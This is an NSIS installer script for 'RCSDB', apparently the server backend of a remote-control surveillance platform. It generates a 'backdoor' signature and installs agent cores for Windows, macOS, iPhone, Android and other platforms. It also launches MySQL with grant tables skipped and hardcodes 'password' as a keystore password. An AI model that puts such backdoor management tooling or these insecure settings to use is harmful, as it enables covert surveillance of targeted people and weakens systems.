;--------------------------------
;Package information

   ;Package name
   !define PACKAGE_NAME "RCSDB"

   ;Package version
   !define /file PACKAGE_VERSION "..\VERSION"

;--------------------------------
;General

   ;Name and file
   Name "${PACKAGE_NAME}"
   OutFile "${PACKAGE_NAME}-${PACKAGE_VERSION}.exe"

   ;Default installation folder
   InstallDir "C:\${PACKAGE_NAME}"

   ;Interface
   !include "MUI2.nsh"
   !define MUI_ABORTWARNING
   !define MUI_WELCOMEFINISHPAGE_BITMAP "HT.bmp"
   !define MUI_WELCOMEFINISHPAGE_BITMAP_NOSTRETCH
   !define MUI_ICON "RCS.ico"
   !define MUI_UNICON "RCS.ico"
   ShowInstDetails "show"
   ShowUninstDetails "show"
   BrandingText "Nullsoft Install System - ${PACKAGE_NAME} (${PACKAGE_VERSION})"

   ;Functions
   !include "nsDialogs.nsh"
   !include "WinMessages.nsh"
   !include "Registry.nsh"
   !include "TextReplace.nsh"
   !include "WordFunc.nsh"
   !include "StrFunc.nsh"
   ${StrTrimNewLines}
   ${StrRep}

   ;Install types
   !define SETUP_INSTALL 0
   !define SETUP_UPDATE 1

   ;Installer pages
   !insertmacro MUI_PAGE_WELCOME
   Page custom FuncConfigureLicense FuncConfigureLicenseLeave
   Page custom FuncConfigureUsers FuncConfigureUsersLeave
   Page custom FuncConfigureDb FuncConfigureDbLeave
   Page custom FuncConfigureCert FuncConfigureCertLeave
   !insertmacro MUI_PAGE_INSTFILES

   ;Uninstaller pages
   !insertmacro MUI_UNPAGE_WELCOME
   UninstPage custom un.FuncDeleteFiles un.FuncDeleteFilesLeave
   !insertmacro MUI_UNPAGE_INSTFILES

   ;Language
   !insertmacro MUI_LANGUAGE "English"

   ;Installer variables
   Var insttype
   Var inifile
   Var oldver

   Var licensectrl
   Var license
   Var adminpassctrl
   Var adminpass
   Var adminpassconfirmctrl
   Var adminpassconfirm
   Var dbrootpassctrl
   Var dbrootpass
   Var dbrootpassconfirmctrl
   Var dbrootpassconfirm
   Var certcnctrl
   Var certcn

   Var dbrcsuserpass
   Var backdoorsign
   Var networksign
   Var serversign
   Var collectorsign

   ;Uninstaller variables
   Var deletefilesctrl
   Var deletefiles

;--------------------------------
;Macros

!macro _ServiceInstallApache
   SimpleSC::InstallService "RCSDB-apache" "RCSDB-apache" "16" "2" "$INSTDIR\apache\bin\httpd -k runservice" "" "" ""
   SimpleSC::SetServiceFailure "RCSDB-apache" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
   WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSDB-apache\Parameters" "ConfigArgs" ""
   ${registry::Write} "HKLM\SYSTEM\CurrentControlSet\Services\RCSDB-apache\Parameters" "ConfigArgs" "" "REG_MULTI_SZ" $R0
   SimpleSC::StartService "RCSDB-apache" ""
   SimpleFC::AddPort 4443 "RCSDB-apache (HTTPS)" 6 0 2 "" 1
!macroend
!define ServiceInstallApache "!insertmacro _ServiceInstallApache"

!macro _ServiceRemoveApache
   SimpleFC::RemovePort 4443 6
   SimpleSC::StopService "RCSDB-apache" 1
   SimpleSC::RemoveService "RCSDB-apache"
!macroend
!define ServiceRemoveApache "!insertmacro _ServiceRemoveApache"

!macro _ServiceInstallMail
   SimpleSC::InstallService "RCSDB-mail" "RCSDB-mail" "16" "2" "$INSTDIR\bin\srvany" "" "" ""
   SimpleSC::SetServiceFailure "RCSDB-mail" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
   WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSDB-mail\Parameters" "Application" "$INSTDIR\php\php-win $INSTDIR\res\phd\RCSDB-mail.php"
   SimpleSC::StartService "RCSDB-mail" ""
!macroend
!define ServiceInstallMail "!insertmacro _ServiceInstallMail"

!macro _ServiceRemoveMail
   SimpleSC::StopService "RCSDB-mail" 1
   SimpleSC::RemoveService "RCSDB-mail"
!macroend
!define ServiceRemoveMail "!insertmacro _ServiceRemoveMail"

!macro _ServiceInstallMonitor
   SimpleSC::InstallService "RCSDB-monitor" "RCSDB-monitor" "16" "2" "$INSTDIR\bin\srvany" "" "" ""
   SimpleSC::SetServiceFailure "RCSDB-monitor" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
   WriteRegStr HKLM "SYSTEM\CurrentControlSet\Services\RCSDB-monitor\Parameters" "Application" "$INSTDIR\php\php-win $INSTDIR\res\phd\RCSDB-monitor.php"
   SimpleSC::StartService "RCSDB-monitor" ""
!macroend
!define ServiceInstallMonitor "!insertmacro _ServiceInstallMonitor"

!macro _ServiceRemoveMonitor
   SimpleSC::StopService "RCSDB-monitor" 1
   SimpleSC::RemoveService "RCSDB-monitor"
!macroend
!define ServiceRemoveMonitor "!insertmacro _ServiceRemoveMonitor"

!macro _ServiceInstallMysql
   SimpleSC::InstallService "RCSDB-mysql" "RCSDB-mysql" "16" "2" "$INSTDIR\mysql\bin\mysqld --skip-grant-table RCSDB-mysql" "" "" ""
   SimpleSC::SetServiceFailure "RCSDB-mysql" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
   SimpleSC::StartService "RCSDB-mysql" ""
   ${Do}
      Sleep 3000
      nsExec::Exec "$INSTDIR\mysql\bin\mysql -u root -b -e $\"QUIT$\""
      Pop $0
   ${LoopUntil} $0 == 0
   nsExec::Exec "$INSTDIR\mysql\bin\mysql_upgrade -u root -f"
   SimpleSC::StopService "RCSDB-mysql" 1
   SimpleSC::StartService "RCSDB-mysql" ""
   ${Do}
      Sleep 3000
      nsExec::Exec "$INSTDIR\mysql\bin\mysql -u root -b -e $\"QUIT$\""
      Pop $0
   ${LoopUntil} $0 == 0
!macroend
!define ServiceInstallMysql "!insertmacro _ServiceInstallMysql"

!macro _ServiceReloadMysql
   SimpleSC::SetServiceBinaryPath "RCSDB-mysql" "$INSTDIR\mysql\bin\mysqld --defaults-file=$INSTDIR\mysql\my.ini RCSDB-mysql"
   nsExec::Exec "$INSTDIR\mysql\bin\mysqladmin -u root reload"
!macroend
!define ServiceReloadMysql "!insertmacro _ServiceReloadMysql"

!macro _ServiceRemoveMysql
   SimpleSC::StopService "RCSDB-mysql" 1
   SimpleSC::RemoveService "RCSDB-mysql"
!macroend
!define ServiceRemoveMysql "!insertmacro _ServiceRemoveMysql"

!macro _ServiceRemoveOld
   SimpleSC::StopService "RCSMAIL" 1
   SimpleSC::RemoveService "RCSMAIL"

   SimpleSC::StopService "RCSMON" 1
   SimpleSC::RemoveService "RCSMON"

   SimpleSC::StopService "Apache2.2" 1
   SimpleSC::RemoveService "Apache2.2"

   SimpleSC::StopService "MySQL" 1
   SimpleSC::RemoveService "MySQL"

   SimpleSC::StopService "MySQL5.0" 1
   SimpleSC::RemoveService "MySQL5.0"
!macroend
!define ServiceRemoveOld "!insertmacro _ServiceRemoveOld"

!macro _EnvSet
   System::Call 'Kernel32::SetEnvironmentVariableA(t, t) i("OPENSSL_CONF", "$INSTDIR\res\cert\files\rcs-openssl.cnf").r0'

   System::Call 'Kernel32::SetEnvironmentVariableA(t, t) i("Path", "$R0").r0'
   ReadRegStr $R0 HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "Path"
   StrCpy $R0 "$R0;$INSTDIR\bin;$INSTDIR\apache\bin;$INSTDIR\php;$INSTDIR\mysql\bin;$INSTDIR\java\bin"
   WriteRegExpandStr HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "Path" "$R0"

   System::Call 'Kernel32::SetEnvironmentVariableA(t, t) i("RCSDB_PATH", "$INSTDIR").r0'
   WriteRegExpandStr HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "RCSDB_PATH" "$INSTDIR"

   SendMessage ${HWND_BROADCAST} ${WM_WININICHANGE} 0 "STR:Environment" /TIMEOUT=5000
!macroend
!define EnvSet "!insertmacro _EnvSet"

!macro _EnvUnset
   ReadRegStr $R0 HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "Path"

   StrCpy $R1 0
   StrLen $R2 "$INSTDIR\"
   ${Do}
      IntOp $R1 $R1 + 1
      ${WordFind} $R0 ";" "E+$R1" $R3
      IfErrors 0 +2
         ${Break}

      StrCmp $R3 $INSTDIR 0 +2
         ${Continue}

      StrCpy $R4 $R3 $R2
      StrCmp $R4 "$INSTDIR\" 0 +2
         ${Continue}

      StrCpy $R5 "$R5$R3;"
   ${Loop}

   ${If} $R3 == 1
      StrCpy $R5 $R0
   ${Else}
      StrCpy $R5 $R5 -1
   ${EndIf}

   System::Call 'Kernel32::SetEnvironmentVariableA(t, t) i("Path", "$R5").r0'
   WriteRegExpandStr HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "Path" "$R5"

   System::Call 'Kernel32::SetEnvironmentVariableA(t, t) i("RCSDB_PATH", "").r0'
   DeleteRegValue HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "RCSDB_PATH"

   SendMessage ${HWND_BROADCAST} ${WM_WININICHANGE} 0 "STR:Environment" /TIMEOUT=5000
!macroend
!define EnvUnset "!insertmacro _EnvUnset"

;--------------------------------
;Sections

Section SecInstall

   DetailPrint "Initializing.."

   ${If} $insttype == ${SETUP_UPDATE}
      ${ServiceRemoveOld}

      ${ServiceRemoveMail}
      ${ServiceRemoveMonitor}
      ${ServiceRemoveApache}
      ${ServiceRemoveMysql}
      ${EnvUnset}

      SetDetailsPrint "textonly"
      SetOutPath "$INSTDIR"
      RMDir /r "$INSTDIR\apache\bin"
      RMDir /r "$INSTDIR\bin"
      RMDir /r "$INSTDIR\java"
      RMDir /r "$INSTDIR\mysql\bin"
      RMDir /r "$INSTDIR\php"
      RMDir /r "$INSTDIR\tmp"
      SetDetailsPrint "both"
   ${EndIf}

   ${EnvSet}

   DetailPrint "Installing files.."

   !system "php rcscrypt.php encrypt"
   SetDetailsPrint "textonly"
   SetOutPath "$INSTDIR\setup"
   File "RCS.ico" "RCSDB-configure.exe"
   !cd ".."
   SetOutPath "$INSTDIR\apache"
   File /r /x "*.bare" "apache\*.*"
   SetOutPath "$INSTDIR\bin"
   File /r /x "*.bare" "bin\*.*"
   SetOutPath "$INSTDIR\install"
   File /r /x "*.bare" "install\*.*"
   SetOutPath "$INSTDIR\java"
   File /r /x "*.bare" "java\*.*"
   SetOutPath "$INSTDIR\mysql"
   File /r /x "*.bare" /x "data" "mysql\*.*"
   ${If} $insttype == ${SETUP_INSTALL}
      SetOutPath "$INSTDIR\mysql\data"
      File /r /x "*.bare" "mysql\data\*.*"
   ${EndIf}
   SetOutPath "$INSTDIR\php"
   File /r /x "*.bare" "php\*.*"
   SetOutPath "$INSTDIR\res"
   File /r /x "*.bare" "res\*.*"
   SetOutPath "$INSTDIR"
   SetDetailsPrint "both"
   !cd "setup"
   !system "php rcscrypt.php clean"

   CreateDirectory "$INSTDIR\etc"
   CreateDirectory "$INSTDIR\tmp"

   StrCpy $0 "$INSTDIR"
   ${textreplace::ReplaceInFile} "$INSTDIR\php\php.ini" "$INSTDIR\php\php.ini" "%RCSDB_PATH%" "$0" "/S=1" $1
   ${StrRep} $0 "$INSTDIR" "\" "/"
   ${textreplace::ReplaceInFile} "$INSTDIR\mysql\my.ini" "$INSTDIR\mysql\my.ini" "%RCSDB_PATH%" "$0" "/S=1" $1
   ${textreplace::ReplaceInFile} "$INSTDIR\apache\conf\httpd.conf" "$INSTDIR\apache\conf\httpd.conf" "%RCSDB_PATH%" "$0" "/S=1" $1
   ${textreplace::ReplaceInFile} "$INSTDIR\apache\conf\extra\httpd-ssl.conf" "$INSTDIR\apache\conf\extra\httpd-ssl.conf" "%RCSDB_PATH%" "$0" "/S=1" $1
   ${textreplace::ReplaceInFile} "$INSTDIR\res\cert\files\rcs-openssl.cnf" "$INSTDIR\res\cert\files\rcs-openssl.cnf" "%RCSDB_PATH%" "$0" "/S=1" $1

   WriteUninstaller "$INSTDIR\setup\${PACKAGE_NAME}-uninstall.exe"
   WriteRegStr   HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PACKAGE_NAME}" "DisplayName"     "${PACKAGE_NAME}"
   WriteRegStr   HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PACKAGE_NAME}" "DisplayIcon"     "$INSTDIR\setup\RCS.ico"
   WriteRegStr   HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PACKAGE_NAME}" "DisplayVersion"  "${PACKAGE_VERSION}"
   WriteRegStr   HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PACKAGE_NAME}" "ModifyPath"      "$INSTDIR\setup\${PACKAGE_NAME}-configure.exe"
   WriteRegStr   HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PACKAGE_NAME}" "UninstallString" "$INSTDIR\setup\${PACKAGE_NAME}-uninstall.exe"
   WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PACKAGE_NAME}" "NoModify"        0x00000000
   WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PACKAGE_NAME}" "NoRepair"        0x00000001

   DetailPrint "Installing libraries.."
   nsExec::ExecToLog "$INSTDIR\bin\vcredist_x86 /q"

   DetailPrint "Installing drivers.."
   nsExec::ExecToLog "$INSTDIR\bin\haspdinst -i -cm -kp -fi"
   SimpleSC::SetServiceFailure "hasplms" "0" "" "" "1" "60000" "1" "60000" "1" "60000"
   StrCpy $0 5000
   ${Do}
      nsExec::Exec /TIMEOUT=$0 "$INSTDIR\php\php --ri rcs"
      Pop $0
      ${If} $0 != 0
         MessageBox MB_OK|MB_ICONEXCLAMATION "Insert USB token and press OK"
         StrCpy $0 15000
      ${EndIf}
   ${LoopUntil} $0 == 0

   WriteINIStr $inifile "db" "host" "p:127.0.0.1"
   WriteINIStr $inifile "db" "db"   "rcs"
   WriteINIStr $inifile "db" "user" "rcsuser"

   DetailPrint "Installing database.."

   ${ServiceInstallMysql}

   ${If} $insttype == ${SETUP_INSTALL}
      DetailPrint "Configuring database.."

      ${ServiceReloadMysql}

      pwgen::GeneratePassword 32
      Pop $dbrcsuserpass
      WriteINIStr $inifile "db" "pass" "$dbrcsuserpass"

      pwgen::GeneratePassword 32
      Pop $backdoorsign
      pwgen::GeneratePassword 32
      Pop $collectorsign
      pwgen::GeneratePassword 32
      Pop $networksign
      pwgen::GeneratePassword 32
      Pop $serversign

      FileOpen $0 "$INSTDIR\install\sql\db.sql" a
      FileSeek $0 0 END
      FileWrite $0 "$\r$\n"
      FileWrite $0 "INSERT INTO `user` (`user`, `pass`, `level`) VALUES ('admin', SHA1('$adminpass'), 128);$\r$\n"
      FileWrite $0 "INSERT INTO `sign` (`scope`, `sign`) VALUES ('backdoor', '$backdoorsign'),$\r$\n"
      FileWrite $0 "                                            ('collector', '$collectorsign'),$\r$\n"
      FileWrite $0 "                                            ('network', '$networksign'),$\r$\n"
      FileWrite $0 "                                            ('server', '$serversign');$\r$\n"
      FileWrite $0 "$\r$\n"
      FileWrite $0 "DROP DATABASE `test`;$\r$\n"
      FileWrite $0 "CREATE USER 'rcsuser'@'localhost' IDENTIFIED BY '$dbrcsuserpass';$\r$\n"
      FileWrite $0 "GRANT SELECT, INSERT, UPDATE, DELETE, LOCK TABLES ON `rcs`.* TO 'rcsuser'@'localhost';$\r$\n"
      FileWrite $0 "DROP USER 'root'@'127.0.0.1';$\r$\n"
      FileWrite $0 "DROP USER ''@'localhost';$\r$\n"
      FileWrite $0 "FLUSH PRIVILEGES;$\r$\n"
      FileClose $0

      nsExec::ExecToLog "$INSTDIR\mysql\bin\mysql -u root -e $\"source $INSTDIR\install\sql\db.sql$\""
      nsExec::ExecToLog "$INSTDIR\mysql\bin\mysql -u root rcs -e $\"source $INSTDIR\install\sql\templates.sql$\""
      nsExec::ExecToLog "$INSTDIR\mysql\bin\mysqladmin -u root password $\"$dbrootpass$\""

      DetailPrint "Creating certificates.."

      FileOpen $0 "$INSTDIR\apache\conf\extra\httpd-servername.conf" w
      FileWrite $0 "ServerName $certcn:4443"
      FileClose $0

      FileOpen $0 "$INSTDIR\res\cert\files\index.txt" w
      FileClose $0

      FileOpen $0 "$INSTDIR\res\cert\files\index.txt.attr" w
      FileWrite $0 "unique_subject = no"
      FileClose $0

      FileOpen $0 "$INSTDIR\res\cert\files\serial.txt" w
      FileWrite $0 "01"
      FileClose $0

      FileOpen $0 "$INSTDIR\install\makecert.bat" w
      FileWrite $0 "@echo off$\r$\n"
      FileWrite $0 "cd $INSTDIR\res\cert$\r$\n"
      FileWrite $0 "$INSTDIR\apache\bin\openssl req -subj /CN=$\"ca$\" -batch -days 3650 -nodes -new -x509 -keyout rcs-ca.key -out rcs-ca.crt$\r$\n"
      FileWrite $0 "$INSTDIR\apache\bin\openssl req -subj /CN=$\"$certcn$\" -batch -days 3650 -nodes -new -keyout rcs-rcsdb.key -out rcs-rcsdb.csr$\r$\n"
      FileWrite $0 "$INSTDIR\apache\bin\openssl req -subj /CN=$\"client$\" -batch -days 3650 -nodes -new -keyout rcs-client.key -out rcs-client.csr$\r$\n"
      FileWrite $0 "$INSTDIR\apache\bin\openssl req -subj /CN=$\"server$\" -batch -days 3650 -nodes -new -keyout rcs-server.key -out rcs-server.crt -x509$\r$\n"
      FileWrite $0 "$INSTDIR\apache\bin\openssl ca -batch -days 3650 -out rcs-rcsdb.crt -in rcs-rcsdb.csr -extensions server$\r$\n"
      FileWrite $0 "$INSTDIR\apache\bin\openssl ca -batch -days 3650 -out rcs-client.crt -in rcs-client.csr$\r$\n"
      FileWrite $0 "copy /b rcs-client.crt + rcs-client.key + rcs-ca.crt $INSTDIR\res\export\ca.pem$\r$\n"
      FileWrite $0 "del *.csr$\r$\n"
      FileWrite $0 "$INSTDIR\php\php files\import.php server rcs-server.crt rcs-server.key$\r$\n"
      FileClose $0

      nsExec::ExecToLog "$INSTDIR\install\makecert.bat"

      CopyFiles /SILENT "$INSTDIR\res\cert\rcs-rcsdb.key" "$INSTDIR\apache\conf\"
      CopyFiles /SILENT "$INSTDIR\res\cert\rcs-rcsdb.crt" "$INSTDIR\apache\conf\"
      CopyFiles /SILENT "$INSTDIR\res\cert\rcs-ca.crt" "$INSTDIR\apache\conf\"

      FileOpen $0 "$INSTDIR\res\export\network.sig" w
      FileWrite $0 "$networksign"
      FileClose $0

      FileOpen $0 "$INSTDIR\res\export\server.sig" w
      FileWrite $0 "$serversign"
      FileClose $0

      nsExec::ExecToLog "$INSTDIR\java\bin\keytool -genkey -dname $\"cn=Server, ou=JavaSoft, o=Sun, c=US$\" -alias ServiceCore -keystore $\"$INSTDIR\res\cert\android.keystore$\" -keyalg RSA -keysize 2048 -validity 10000 -keypass password -storepass password"

      CreateShortCut "$DESKTOP\RCSDB-export.lnk" "$INSTDIR\res\export"

      FileOpen $0 "$INSTDIR\VERSION" w
      FileWrite $0 "${PACKAGE_VERSION}"
      FileClose $0
   ${ElseIf} $insttype == ${SETUP_UPDATE}
      DetailPrint "Upgrading system.."

      ${Switch} $oldver
         ${Case} 2010011901   ;RCS-6.0.0
            DetailPrint "6.0.0 -> 6.1.0"
            FileOpen $0 "$INSTDIR\VERSION" w
            FileWrite $0 "2010011901"
            FileClose $0
            nsExec::ExecToLog "$INSTDIR\mysql\bin\mysql -u root rcs -e $\"source $INSTDIR\install\sql\6.0.0.sql$\""
            Pop $0
            ${If} $0 != 0
               MessageBox MB_OK|MB_ICONSTOP "Fatal error!"
               Abort "Fatal error!"
            ${EndIf}
         ${Case} 2010031201   ;RCS-6.1.0
            DetailPrint "6.1.0 -> 6.2.0"
            FileOpen $0 "$INSTDIR\VERSION" w
            FileWrite $0 "2010031201"
            FileClose $0
            nsExec::ExecToLog "$INSTDIR\mysql\bin\mysql -u root rcs -e $\"source $INSTDIR\install\sql\6.1.0.sql$\""
            Pop $0
            ${If} $0 != 0
               MessageBox MB_OK|MB_ICONSTOP "Fatal error!"
               Abort "Fatal error!"
            ${EndIf}
         ${Case} 2010061101   ;RCS-6.2.0
            DetailPrint "6.2.0 -> 6.2.1"
            FileOpen $0 "$INSTDIR\VERSION" w
            FileWrite $0 "2010061101"
            FileClose $0
            nsExec::ExecToLog "$INSTDIR\mysql\bin\mysql -u root rcs -e $\"source $INSTDIR\install\sql\6.2.0.sql$\""
            Pop $0
            ${If} $0 != 0
               MessageBox MB_OK|MB_ICONSTOP "Fatal error!"
               Abort "Fatal error!"
            ${EndIf}
         ${Case} 2010073101   ;RCS-6.2.1
            DetailPrint "6.2.1 -> 6.2.2"
            FileOpen $0 "$INSTDIR\VERSION" w
            FileWrite $0 "2010073101"
            FileClose $0
            nsExec::ExecToLog "$INSTDIR\mysql\bin\mysql -u root rcs -e $\"source $INSTDIR\install\sql\6.2.1.sql$\""
            Pop $0
            ${If} $0 != 0
               MessageBox MB_OK|MB_ICONSTOP "Fatal error!"
               Abort "Fatal error!"
            ${EndIf}
         ${Case} 2010091001   ;RCS-6.2.2
            DetailPrint "6.2.2 -> 7.0.0"
            FileOpen $0 "$INSTDIR\VERSION" w
            FileWrite $0 "2010091001"
            FileClose $0
            ReadINIStr $0 "C:\RCSDB\apache\htdocs\etc\RCSDB.ini" "dbdata" "pass"
            WriteINIStr $inifile "db" "pass" "$0"
            ReadINIStr $0 "C:\RCSDB\apache\htdocs\etc\RCSDB.ini" "mail" "enabled"
            WriteINIStr $inifile "mail" "enabled" "$0"
            WriteINIStr $inifile "mail" "queue" "$INSTDIR\tmp\mailqueue"
            ReadINIStr $0 "C:\RCSDB\apache\htdocs\etc\RCSDB.ini" "mail" "host"
            WriteINIStr $inifile "mail" "host" "$0"
            ReadINIStr $0 "C:\RCSDB\apache\htdocs\etc\RCSDB.ini" "mail" "port"
            WriteINIStr $inifile "mail" "port" "$0"
            FileOpen $0 "$INSTDIR\apache\conf\extra\httpd-servername.conf" w
            FileWrite $0 "ServerName localhost:4443"
            FileClose $0
            CopyFiles "C:\RCSDB\cert\files\*.txt" "$INSTDIR\res\cert\files\"
            CopyFiles "C:\RCSDB\cert\files\*.attr" "$INSTDIR\res\cert\files\"
            CopyFiles "C:\RCSDB\cert\files\*.pem" "$INSTDIR\res\cert\files\"
            CopyFiles "C:\RCSDB\cert\rcs-ca\rcs-ca.key" "$INSTDIR\res\cert\"
            CopyFiles "C:\RCSDB\cert\rcs-ca\rcs-ca.crt" "$INSTDIR\res\cert\"
            CopyFiles "C:\RCSDB\cert\rcs-rcsdb\rcs-rcsdb.key" "$INSTDIR\res\cert\"
            CopyFiles "C:\RCSDB\cert\rcs-rcsdb\rcs-rcsdb.crt" "$INSTDIR\res\cert\"
            CopyFiles "C:\RCSDB\cert\rcs-client\rcs-client.key" "$INSTDIR\res\cert\"
            CopyFiles "C:\RCSDB\cert\rcs-client\rcs-client.crt" "$INSTDIR\res\cert\"
            CopyFiles "C:\RCSDB\cert\rcs-server\rcs-server.key" "$INSTDIR\res\cert\"
            CopyFiles "C:\RCSDB\cert\rcs-server\rcs-server.crt" "$INSTDIR\res\cert\"
            CopyFiles "C:\RCSDB\cert\rcs-client\rcs-client.pem" "$INSTDIR\res\export\ca.pem"
            nsExec::ExecToStack "$INSTDIR\mysql\bin\mysql -u root rcs --batch --skip-column-names -e $\"SELECT `sign` FROM `sign` WHERE `scope` IN ('network', 'server') ORDER BY `scope`$\""
            Pop $1
            Pop $1
            ${StrTrimNewLines} $2 $1
            StrCpy $1 $2 32
            FileOpen $0 "$INSTDIR\res\export\network.sig" w
            FileWrite $0 $1
            FileClose $0
            StrCpy $1 $2 "" -32
            FileOpen $0 "$INSTDIR\res\export\server.sig" w
            FileWrite $0 $1
            FileClose $0
            CreateShortCut "$DESKTOP\RCSDB-export.lnk" "$INSTDIR\res\export"
            nsExec::ExecToLog "$INSTDIR\mysql\bin\mysql -u root rcs -e $\"source $INSTDIR\install\sql\6.2.2.sql$\""
            Pop $0
            ${If} $0 != 0
               MessageBox MB_OK|MB_ICONSTOP "Fatal error!"
               Abort "Fatal error!"
            ${EndIf}
            SetDetailsPrint "textonly"
            RMDir /r "C:\RCSDB\aladdin"
            RMDir /r "C:\RCSDB\build"
            RMDir /r "C:\RCSDB\cert"
            RMDir /r "C:\RCSDB\gocr"
            RMDir /r "C:\RCSDB\imagemagick"
            RMDir /r "C:\RCSDB\phd"
            RMDir /r "C:\RCSDB\phpmyadmin"
            RMDir /r "C:\RCSDB\runtime"
            RMDir /r "C:\RCSDB\apache\htdocs\etc"
            RMDir /r "C:\RCSDB\apache\htdocs\rcsconsole"
            RMDir /r "C:\RCSDB\apache\htdocs\zip"
            SetDetailsPrint "both"
         ${Case} 2010103101   ;RCS-7.0.0
            DetailPrint "7.0.0 -> 7.1.0"
            FileOpen $0 "$INSTDIR\VERSION" w
            FileWrite $0 "2010103101"
            FileClose $0
            nsExec::ExecToLog "$INSTDIR\mysql\bin\mysql -u root rcs -e $\"source $INSTDIR\install\sql\7.0.0.sql$\""
            Pop $0
            ${If} $0 != 0
               MessageBox MB_OK|MB_ICONSTOP "Fatal error!"
               Abort "Fatal error!"
            ${EndIf}
         ${Case} 2011011101   ;RCS-7.1.0
            DetailPrint "7.1.0 -> 7.2.0"
            FileOpen $0 "$INSTDIR\VERSION" w
            FileWrite $0 "2011011101"
            FileClose $0
            nsExec::ExecToLog "$INSTDIR\mysql\bin\mysql -u root rcs -e $\"source $INSTDIR\install\sql\7.1.0.sql$\""
            Pop $0
            ${If} $0 != 0
               MessageBox MB_OK|MB_ICONSTOP "Fatal error!"
               Abort "Fatal error!"
            ${EndIf}
         ${Case} 2011032101   ;RCS-7.2.0
            DetailPrint "7.2.0 -> CURRENT"
            FileOpen $0 "$INSTDIR\VERSION" w
            FileWrite $0 "2011032101"
            FileClose $0
            nsExec::ExecToLog "$INSTDIR\java\bin\keytool -genkey -dname $\"cn=Server, ou=JavaSoft, o=Sun, c=US$\" -alias ServiceCore -keystore $\"$INSTDIR\res\cert\android.keystore$\" -keyalg RSA -keysize 2048 -validity 10000 -keypass password -storepass password"
         ${Case} ${PACKAGE_VERSION}   ;CURRENT
            FileOpen $0 "$INSTDIR\VERSION" w
            FileWrite $0 "${PACKAGE_VERSION}"
            FileClose $0
      ${EndSwitch}

      ${ServiceReloadMysql}

   ${EndIf}

   WriteINIStr $inifile "general" "version" "7.3.0"

   DetailPrint "Installing core files.."

   nsExec::ExecToLog "$INSTDIR\php\php $INSTDIR\install\core\core-install.php WIN32 ${PACKAGE_VERSION}"
   nsExec::ExecToLog "$INSTDIR\php\php $INSTDIR\install\core\core-install.php WINMOBILE ${PACKAGE_VERSION}"
   nsExec::ExecToLog "$INSTDIR\php\php $INSTDIR\install\core\core-install.php MACOS ${PACKAGE_VERSION}"
   nsExec::ExecToLog "$INSTDIR\php\php $INSTDIR\install\core\core-install.php IPHONE ${PACKAGE_VERSION}"
   nsExec::ExecToLog "$INSTDIR\php\php $INSTDIR\install\core\core-install.php BLACKBERRY ${PACKAGE_VERSION}"
   nsExec::ExecToLog "$INSTDIR\php\php $INSTDIR\install\core\core-install.php SYMBIAN ${PACKAGE_VERSION}"
   nsExec::ExecToLog "$INSTDIR\php\php $INSTDIR\install\core\core-install.php ANDROID ${PACKAGE_VERSION}"

   FileOpen $0 "$INSTDIR\apache\htdocs\.htaccess" a
   FileSeek $0 0 END
   FileWrite $0 "SetEnv RCSDB_PATH $INSTDIR$\r$\n"
   FileWrite $0 "SetEnv RCSDB_VERSION ${PACKAGE_VERSION}$\r$\n"
   FileClose $0

   DetailPrint "Installing license.."
   CopyFiles /SILENT $license "$INSTDIR\etc\RCSDB.lic"

   DetailPrint "Installing services.."

   ${ServiceInstallApache}
   ${ServiceInstallMonitor}
   ${ServiceInstallMail}

   SetDetailsPrint "textonly"
   RMDir /r "$INSTDIR\install"
   SetDetailsPrint "both"

SectionEnd

Section Uninstall

  ReadRegStr $0 HKLM "SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "RCSDB_PATH"

   StrCmp $0 "" 0 +3
      MessageBox MB_OK|MB_ICONSTOP "Invalid RCSDB_PATH $0"
      Quit

   StrLen $1 "\${PACKAGE_NAME}"
   StrCpy $2 $0 "" -$1
   ${If} $2 S!= "\${PACKAGE_NAME}"
      MessageBox MB_OK|MB_ICONSTOP "Invalid RCSDB_PATH $0"
      Quit
   ${EndIf}

   StrCpy $INSTDIR "$0"

   ${ServiceRemoveMail}
   ${ServiceRemoveMonitor}
   ${ServiceRemoveApache}
   ${ServiceRemoveMysql}
   ${EnvUnset}

   ${If} $deletefiles == ${BST_CHECKED}
      RMDir /r "$INSTDIR"
   ${EndIf}

   DeleteRegKey HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PACKAGE_NAME}"

SectionEnd

;--------------------------------
;Functions

Function .onInit

   ReadEnvStr $0 RCSDB_PATH

   StrCmp $0 $INSTDIR 0 +2
      StrCpy $0 ""

   ${If} $0 != ""
      ${Do}
         ${StrFilter} $0 "12" ":\" "" $1
         ${If} $1 != $0
            ${Break}
         ${EndIf}

         StrLen $1 "\${PACKAGE_NAME}"
         StrCpy $2 $0 "" -$1
         ${If} $2 S!= "\${PACKAGE_NAME}"
            ${Break}
         ${EndIf}

         StrCpy $1 "ok"
      ${LoopUntil} 0 == 0

      ${If} $1 == "ok"
         StrCpy $INSTDIR $0
         MessageBox MB_OK|MB_ICONINFORMATION "Custom ${PACKAGE_NAME} path set to $INSTDIR"
      ${Else}
         MessageBox MB_OK|MB_ICONSTOP "Invalid custom path $0"
         Quit
      ${EndIf}
   ${EndIf}

   CreateDirectory "$INSTDIR"
   IfFileExists "$INSTDIR" +3 0
      MessageBox MB_OK|MB_ICONSTOP "Unable to create $INSTDIR"
      Quit

   StrCpy $insttype ${SETUP_INSTALL}
   IfFileExists "$INSTDIR\VERSION" 0 +2
      StrCpy $insttype ${SETUP_UPDATE}

